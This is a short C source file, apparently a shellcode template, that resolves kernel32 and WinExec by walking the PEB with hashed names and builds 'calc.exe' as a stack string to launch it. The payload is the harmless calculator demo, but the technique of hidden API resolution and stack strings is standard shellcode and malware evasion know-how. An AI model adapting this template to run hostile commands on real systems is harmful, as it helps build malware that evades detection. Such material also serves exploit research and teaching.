#include "peb.h"

#define kernel32_hash 0x8FECD63F
#define win_exec_hash 0x4F0AFE98

typedef UINT WINAPI WinExec_t(
    LPCSTR lpCmdLine,
    UINT   uCmdShow
);

void shellcode() {
    HMODULE kernel32 = peb_get_module(kernel32_hash);

    WinExec_t *WinExec = (WinExec_t *)
        peb_get_symbol(kernel32, win_exec_hash);

    char calc_exe[] = {
        'c', 'a', 'l', 'c',
        '.', 'e', 'x', 'e',
        0
    };
    
    WinExec(calc_exe, SW_SHOW);
}